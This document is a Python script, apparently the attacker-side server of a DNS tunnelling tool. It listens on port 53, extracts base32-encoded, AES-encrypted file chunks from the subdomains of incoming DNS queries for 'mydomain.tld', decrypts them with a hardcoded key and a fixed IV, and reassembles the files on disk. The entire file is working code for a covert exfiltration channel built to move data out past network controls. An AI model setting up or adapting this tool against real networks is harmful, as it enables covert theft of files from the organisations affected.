#!/usr/bin/python3

# Author: "omroot"
# omroot.io
# LICENSE: GPLv3.0


import re
import sys
import base64
import socket
import secrets
import binascii
import argparse
import colorama
from dnslib import DNSRecord
from Crypto.Cipher import AES


# Colors:
red   = colorama.Fore.RED
cyan  = colorama.Fore.CYAN
white = colorama.Fore.WHITE
yellow= colorama.Fore.YELLOW
reset = colorama.Fore.RESET


class PKCS7Encoder(object):
    """                      
    https://gist.githubusercontent.com/chrix2/4171336/raw/a630d1cf9dbab7d01ee75ada5832fdeb3066e40d/pkcs7.py
    With some modifications.
    """                      

    def __init__(self, k=16):
        # Size of the block. 
        self.k = k

    def decode(self, text):
        """
        Removes the PKCS#7 padding from a text string
        This is tested for one block currently..
        """

        nl = len(text)
        val = int(hex(text[-1]), 16)
        for i in range(len(text)-1, len(text)-val-1, -1):
            # Check all paddings. If they're wrong, then raise the exception.
            if text[i] != val:
                raise ValueError('Input is not padded or padding is corrupt')
        l = nl - val
        return text[:l]

def decrypt(data):
    """
    Decrypts data.
    Note that the IV and shared_key must match on client & server.

    NOTE: you might want to change both of them (shared_key, IV).
    """

    # A key to encrypt/decrypt data.
    shared_key = b"\xa1\xc0\x84\x21\xa3\x61\x91\xb3\x1a\xe4\xd2\xd4\xc6\xa2\x34\xb3" \
                 b"\x34\x10\x8f\x9a\x32\x85\xa5\x4d\x31\x48\x81\x39\x0b\x89\x6a\x23"
    # Initialization vector:
    IV = b"\xe3\x62\x72\x5c\xe2\x75\x24\x67\x8b\x4e\x54\x37\x07\xa1\xb9\x80"
    aes_decrypter = AES.new(shared_key, AES.MODE_CBC, IV)
    aes_decrypter.block_size = 128
    clear_text = PKCS7Encoder().decode(aes_decrypter.decrypt(base64.b32decode(data)))
    return clear_text

# Globals:
RANDOM_FILE_NAME = secrets.token_hex(5) + '.bin'

def create_socket(addr, port):
    """
    Creates a UDP socket.
    """

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((addr, port))
    except OSError as e:
        print(f"{red}Cannot bind to port {white}{port}{reset}{red}:{reset}", e)
        sys.exit(1)
    return s

def save_data(data):
    """
    A Wrapper to recover data.
    """

    data = data.replace("-", "=")
    # Remove the b' & '. because of an earlier str.
    data = data[2:-1]
    data = decrypt(data)
    with open(RANDOM_FILE_NAME, 'ab') as f:
        f.write(data)
    f.close()

def receive_info(s, v):
    """
    Parses the DNS request and takes the specific 
    info we're interested in.
    """

    byteData, addr = s.recvfrom(2048)
    try:
        msg = binascii.unhexlify(binascii.b2a_hex(byteData))
        msg = DNSRecord.parse(msg)
    except Exception as e:
        print(e)
        return
    m = re.search(r'\;(\S+)\.mydomain\.tld', str(msg), re.MULTILINE)
    if m:
        received_data = m.group(1)
        if v: print(f'{white}Received data:{reset}', received_data)
        if(received_data == "EOF"):
            global RANDOM_FILE_NAME
            print(f"{white}File has been saved as{reset} {yellow}{RANDOM_FILE_NAME}{reset}{white} .{reset}")
            RANDOM_FILE_NAME = secrets.token_hex(5) + '.bin'
            return
        save_data(received_data)

def main():
    parser = argparse.ArgumentParser(description="A server to receive files send by a client through DNS") 
    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose', 
                    help='Verbosity.')
    parser.add_argument('-l', '--address', action='store', type=str, default="0.0.0.0", dest='addr',
                    help='listening address.')
    parser.add_argument('-p', '--port', action='store', type=int, default=53, dest='dns_port',
                    help='DNS port.')
    args = parser.parse_args()
    
    s = create_socket(args.addr, args.dns_port)
    print(f"{white}Start listening for DNS requests{reset} {cyan}{args.addr}{reset}{white}:{reset}{cyan}{args.dns_port}{reset}")
    while True:
        try:
            receive_info(s, args.verbose)
        except KeyboardInterrupt:
            print(f"\n{white}Exiting{reset}")
            sys.exit(0)

if __name__ == "__main__":
    main()
